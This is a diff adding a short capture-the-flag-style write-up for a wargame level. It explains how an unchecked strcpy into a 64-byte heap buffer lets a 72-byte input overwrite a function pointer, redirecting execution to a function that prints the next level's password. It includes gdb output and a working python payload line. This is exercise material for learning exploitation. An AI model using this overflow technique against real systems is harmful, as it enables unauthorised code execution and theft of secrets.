@@ -1,0 +1,49 @@
+We can observe two functions, `n` and `m`
+`n` prints the .pass file of level7's home
+`m` printf "Nope"
+
+In the main function, there are two mallocs.
+* One of 64 bytes
+* The other of 4 bytes
+
+The first one is used to copy argv[1] into it
+The second one is assigned to the value `0x8048468`. This is the address of function `m`
+We can verify it by using gdb
+
+> i functions
+> ...
+> 0x08048454  n
+> 0x08048468  m <-- this one
+> ...
+
+We'll exploit a buffer overflow on the heap as `strcpy` does not check the length of what is being copied.
+We need to locate both heap address.
+
+Using gdb
+```
+  0x08048482 <+6>:     sub    esp,0x20
+  0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
+  0x0804848c <+16>:    call   0x8048350 <malloc@plt>
+  0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
+  0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
+  0x0804849c <+32>:    call   0x8048350 <malloc@plt>
+  0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
+```
+
+buf1 = 0x0804a008 @ ebp-0xc - will contains argv[1]
+buf2 = 0x0804a050 @ ebp-0x10
+buf2 - buf1 = 72 characters to write before overwriting buf2
+
+> r $(python -c 'print "A" * 72')
+
+Then we'll need to write the address of the `n` function
+
+> i functions
+> ...
+> 0x08048454  n
+> 0x08048468  m
+> ...
+
+> r $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
+
+And voila
